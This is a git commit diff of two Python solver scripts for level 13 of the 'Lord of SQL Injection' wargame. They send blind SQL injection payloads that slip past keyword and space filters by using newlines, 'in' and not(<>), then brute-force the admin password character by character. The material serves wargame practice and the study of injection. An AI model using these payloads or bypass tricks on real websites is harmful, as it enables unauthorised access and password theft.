f80bb51ca9fd6d16c6b4f7545f0df1b3aa141300
Moreal <dev.moreal@gmail.com>
2018-01-07 10:25:59 +0900

    LOS : 13 Bugbear

--- Wargame/Lord of SQL Injection/Code/13_Bugbear.py
+++ Wargame/Lord of SQL Injection/Code/13_Bugbear.py
@@ -2,10 +2,11 @@
 import string
 from web import *
 
-url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?&no={}"
+url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?&no={}"
 
 # get length
-inject_url = '0 or id like "admin" and length(pw) like {}'
+# query 0%7C%7Cid%0ain%0a("admin")%0a%26%26length(pw)%0ain%0a(7)
+inject_url = '0\n||\nid\nin\n("admin")\n&&\nlength(pw)\nin\n({})'
 for i in range(1, 100):
     req = getRequest(url,inject_url.format(i), show=False)
     page = getPage(req)
@@ -17,7 +18,7 @@ print "Length :",length
 
 # get password : brute forcing
 password = ""
-inject_url = '0 || id like "admin" and mid(pw,{},1) like "{}"'
+inject_url = '0\n||\nid\nin("admin")&&mid(pw,{},1)\nin\n("{}")'
 for i in range(1,length+1):
     for c in string.digits + string.letters:
         req = getRequest(url, inject_url.format(i,c),show=False)
--- Wargame/Lord of SQL Injection/Code/13_Bugbear_other_case.py
+++ Wargame/Lord of SQL Injection/Code/13_Bugbear_other_case.py
@@ -2,10 +2,11 @@
 import string
 from web import *
 
-url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?&no={}"
+url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?&no={}"
 
 # get length
-inject_url = '0 or id like "admin" and length(pw) like {}'
+# query 0%7C%7Cid%0ain%0a("admin")%0a%26%26length(pw)%0ain%0a(7)
+inject_url = '0||not(id<>"admin")&&not(length(pw)<>{})'
 for i in range(1, 100):
     req = getRequest(url,inject_url.format(i), show=False)
     page = getPage(req)
@@ -17,10 +18,10 @@ print "Length :",length
 
 # get password : brute forcing
 password = ""
-inject_url = '0 || id like "admin" and mid(pw,{},1) like "{}"'
+inject_url = '0||not(id<>"admin")&&not(mid(pw,{},1)<>"{}")'
 for i in range(1,length+1):
     for c in string.digits + string.letters:
-        req = getRequest(url, inject_url.format(i,c),show=False)
+        req = getRequest(url, inject_url.format(i,c), show=False)
         page = getPage(req)
         if "Hello admin" in page:
             print i,"'th letter is",c
